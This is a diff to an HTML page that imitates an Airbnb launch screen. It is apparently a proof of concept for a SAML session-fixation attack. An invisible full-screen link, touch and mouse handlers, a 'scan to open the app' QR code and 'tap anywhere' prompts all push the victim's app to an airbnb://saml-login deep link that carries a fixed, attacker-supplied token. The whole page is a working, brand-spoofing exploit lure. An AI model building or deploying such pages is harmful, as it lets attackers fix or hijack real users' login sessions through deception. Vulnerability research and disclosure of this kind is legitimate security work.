@@ -6,7 +6,14 @@
   <title>Airbnb</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body { height: 100%; background: #FF5A5F; font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", sans-serif; user-select: none; -webkit-tap-highlight-color: transparent; }
+    html, body {
+      min-height: 100%;
+      background: #FF5A5F;
+      font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", sans-serif;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    /* ── full-screen tap target (mobile) ── */
     #tap {
       display: block;
       position: fixed;
@@ -14,32 +21,73 @@
       z-index: 999;
       text-decoration: none;
     }
+
+    /* ── layout ── */
     .screen {
-      height: 100%;
+      min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      gap: 32px;
+      gap: 28px;
+      padding: 48px 24px;
     }
-    .logo { width: 72px; height: 72px; fill: #fff; }
-    .wordmark { font-size: 32px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
+
+    .logo { width: 64px; height: 64px; fill: #fff; }
+    .wordmark { font-size: 28px; font-weight: 700; color: #fff; letter-spacing: -0.5px; }
+
+    /* ── QR card ── */
+    .qr-wrap {
+      background: #fff;
+      border-radius: 16px;
+      padding: 18px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.18);
+      position: relative;
+      z-index: 1000; /* above #tap so camera can interact */
+      pointer-events: auto;
+    }
+    .qr-wrap img { display: block; width: 220px; height: 220px; }
+
+    .qr-label {
+      font-size: 13px;
+      color: rgba(255,255,255,0.75);
+      text-align: center;
+      letter-spacing: 0.02em;
+      line-height: 1.5;
+    }
+
+    /* ── divider ── */
+    .or {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      width: 240px;
+    }
+    .or hr { flex: 1; border: none; border-top: 1px solid rgba(255,255,255,0.25); }
+    .or span { font-size: 12px; color: rgba(255,255,255,0.45); white-space: nowrap; }
+
+    /* ── tap hint ── */
+    .tap-hint {
+      font-size: 13px;
+      color: rgba(255,255,255,0.6);
+      text-align: center;
+    }
+
+    /* ── loader ── */
     .loader { display: flex; gap: 8px; }
-    .loader span { width: 8px; height: 8px; border-radius: 50%; background: rgba(255,255,255,0.65); animation: pulse 1.2s ease-in-out infinite; }
+    .loader span {
+      width: 7px; height: 7px; border-radius: 50%;
+      background: rgba(255,255,255,0.6);
+      animation: pulse 1.2s ease-in-out infinite;
+    }
     .loader span:nth-child(2) { animation-delay: 0.2s; }
     .loader span:nth-child(3) { animation-delay: 0.4s; }
     @keyframes pulse { 0%,100%{opacity:.3;transform:scale(.85)} 50%{opacity:1;transform:scale(1.1)} }
-    .hint { position: fixed; bottom: 44px; left: 0; right: 0; text-align: center; font-size: 13px; color: rgba(255,255,255,0.45); letter-spacing: 0.02em; }
   </style>
 </head>
 <body>
 
-<!--
-  touchstart fires BEFORE the browser decides what to do with the tap.
-  We update href to a fresh URL with a timestamp nonce so Chrome never
-  sees the same URL twice. The browser then follows the anchor natively —
-  more reliable than window.location.href on Chrome Android.
--->
+<!-- full-screen anchor for mobile tap — href updated on touchstart -->
 <a id="tap" href="airbnb://saml-login?saml_token=6bihac4mstjga4k5ba2bncqif_A4W_SAML_FIXATION_PROOF&_t=0"></a>
 
 <div class="screen">
@@ -47,22 +95,32 @@
     <path d="M16 1C10.5 1 1 11.4 1 19.1c0 4.4 2.8 7.7 6.9 7.7 2.2 0 4.1-.9 5.8-2.6l.3-.3.3.3c1.7 1.7 3.6 2.6 5.8 2.6 4.1 0 6.9-3.3 6.9-7.7C27 11.4 21.5 1 16 1zm5.8 22.5c-1.6 0-3-.7-4.4-2.2L16 19.8l-1.4 1.5c-1.4 1.5-2.8 2.2-4.4 2.2-2.9 0-4.7-2.3-4.7-5.4 0-6.6 8.4-16 10.5-16s10.5 9.4 10.5 16c0 3.1-1.8 5.4-4.7 5.4z"/>
   </svg>
   <div class="wordmark">airbnb</div>
+
+  <!-- QR code — scan with Android camera to open app directly, no browser involved -->
+  <div class="qr-wrap">
+    <img src="qr.png" alt="QR code — scan to launch Airbnb">
+  </div>
+  <p class="qr-label">Scan with camera to open the Airbnb app</p>
+
+  <div class="or">
+    <hr><span>or on mobile</span><hr>
+  </div>
+
+  <p class="tap-hint">Tap anywhere on this page</p>
   <div class="loader"><span></span><span></span><span></span></div>
 </div>
-
-<p class="hint">Tap anywhere to continue</p>
 
 <script>
   var TOKEN = "6bihac4mstjga4k5ba2bncqif_A4W_SAML_FIXATION_PROOF";
   var tap = document.getElementById("tap");
 
-  // Update href on touchstart — fires before the browser follows the link.
-  // Fresh timestamp each touch = Chrome treats it as a new URL every time.
+  // touchstart fires before browser follows the link — update href so Chrome
+  // sees a fresh URL each time (prevents same-URL deduplication)
   tap.addEventListener("touchstart", function() {
     tap.href = "airbnb://saml-login?saml_token=" + encodeURIComponent(TOKEN) + "&_t=" + Date.now();
   }, { passive: true });
 
-  // Fallback for desktop / mouse clicks (keeps PoC testable in devtools)
+  // desktop fallback
   tap.addEventListener("mousedown", function() {
     tap.href = "airbnb://saml-login?saml_token=" + encodeURIComponent(TOKEN) + "&_t=" + Date.now();
   });
